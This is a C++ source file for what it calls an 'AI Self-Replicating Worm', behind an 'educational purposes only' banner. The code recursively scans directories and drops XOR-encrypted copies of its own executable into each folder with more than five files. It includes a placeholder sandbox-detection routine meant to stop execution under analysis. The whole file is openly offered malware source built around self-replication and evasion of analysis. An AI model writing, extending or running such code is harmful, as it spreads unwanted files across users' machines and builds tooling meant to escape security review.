#include <iostream>
#include <vector>
#include <string>
#include <fstream>
#include <random>
#include <filesystem>

namespace fs = std::filesystem;

// Simple C++ implementation of the AI Self-Replicating Worm
// This is a basic version focusing on core functionality

void printBanner() {
    std::cout << "=====================================\n";
    std::cout << "AI Self-Replicating Worm (C++ Basic)\n";
    std::cout << "WARNING: For educational purposes only\n";
    std::cout << "=====================================\n\n";
}

bool isInSandbox() {
    // Basic sandbox detection
    std::cout << "[*] Checking environment...\n";
    return false; // Simplified for basic implementation
}

void polymorphicEncrypt(std::vector<unsigned char>& data) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1, 255);

    unsigned char key = dis(gen);
    std::cout << "[*] Encrypting with key: " << static_cast<int>(key) << "\n";

    // Simple XOR encryption (skip first 2 bytes for MZ header)
    for (size_t i = 2; i < data.size(); ++i) {
        data[i] ^= key;
    }
}

void dropAndSpawn(const fs::path& targetDir, const std::vector<unsigned char>& myBinary) {
    // Create polymorphic copy
    std::vector<unsigned char> encryptedBinary = myBinary;
    polymorphicEncrypt(encryptedBinary);

    // Generate random filename
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1000, 9999);
    std::string fileName = "worm_" + std::to_string(dis(gen)) + ".exe";
    fs::path targetPath = targetDir / fileName;

    // Write to disk
    std::ofstream outFile(targetPath, std::ios::binary);
    if (outFile) {
        outFile.write(reinterpret_cast<const char*>(encryptedBinary.data()), encryptedBinary.size());
        outFile.close();
        std::cout << "[+] Dropped to: " << targetPath.string() << "\n";
    } else {
        std::cout << "[-] Failed to write: " << targetPath.string() << "\n";
    }
}

void scanAndSpread(bool verbose) {
    // Read own binary
    std::vector<unsigned char> myBinary;
    std::ifstream selfFile("worm_cpp.exe", std::ios::binary | std::ios::ate);
    if (selfFile.is_open()) {
        std::streamsize size = selfFile.tellg();
        selfFile.seekg(0, std::ios::beg);
        myBinary.resize(size);
        selfFile.read(reinterpret_cast<char*>(myBinary.data()), size);
        selfFile.close();
    } else {
        std::cout << "[-] Cannot read own binary\n";
        return;
    }

    std::cout << "[*] Starting directory scan...\n";

    try {
        for (const auto& entry : fs::recursive_directory_iterator(".", fs::directory_options::skip_permission_denied)) {
            if (entry.is_directory()) {
                std::string dirName = entry.path().filename().string();

                // Skip system directories
                if (dirName == "Windows" || dirName == "System32" || dirName == "Program Files") {
                    continue;
                }

                // Count files in directory
                int fileCount = 0;
                try {
                    for (const auto& _ : fs::directory_iterator(entry)) {
                        fileCount++;
                    }
                } catch (...) {
                    fileCount = 0;
                }

                // Simple AI decision: drop if > 5 files
                if (fileCount > 5) {
                    if (verbose) {
                        std::cout << "[SCAN] " << dirName << " (" << fileCount << " files)\n";
                    }
                    dropAndSpawn(entry.path(), myBinary);
                }
            }
        }
    } catch (const std::exception& e) {
        std::cout << "[-] Scan error: " << e.what() << "\n";
    }
}

int main(int argc, char* argv[]) {
    bool verbose = (argc > 1 && std::string(argv[1]) == "--verbose");

    printBanner();

    if (isInSandbox()) {
        std::cout << "[-] Sandbox detected. Exiting.\n";
        return 0;
    }

    std::cout << "[+] Starting worm execution...\n";
    scanAndSpread(verbose);
    std::cout << "[*] Execution completed.\n";

    return 0;
}
